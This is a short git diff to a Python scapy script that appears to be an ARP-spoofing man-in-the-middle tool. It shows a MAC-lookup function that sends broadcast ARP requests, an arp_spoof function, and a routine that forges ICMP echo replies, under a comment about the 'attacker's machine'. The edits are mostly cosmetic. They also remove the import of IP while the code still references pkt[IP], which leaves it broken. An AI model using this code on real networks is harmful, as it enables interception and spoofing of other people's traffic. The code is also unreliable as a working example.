@@ -1,17 +1,16 @@
 #!/usr/bin/env python3
 
 
-from scapy.layers.inet import IP    #from scapy.all import *
 import scapy.all as scapy
 import os
-import sys
+import sys                  #sys.argv
 import time
 import threading
 
 
 
 
-# Enable IP forwarding on the attacker's machine
+"""----------------------------Enable IP forwarding on the attacker's machine"""
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
@@ -38,8 +37,7 @@ def arp_spoof():
 
 
 def send_icmp_response(pkt):
-    # Create the ICMP response packet
-	resp = scapy.IP(dst=pkt[IP].src, 
+	resp = scapy.IP(dst=pkt[IP].src,                     # Create the ICMP response packet
                     src=pkt[IP].dst)/scapy.ICMP(type='echo-reply', 
                     id=pkt[scapy.ICMP].id, 
                     seq=pkt[scapy.ICMP].seq)/pkt[scapy.ICMP].payload
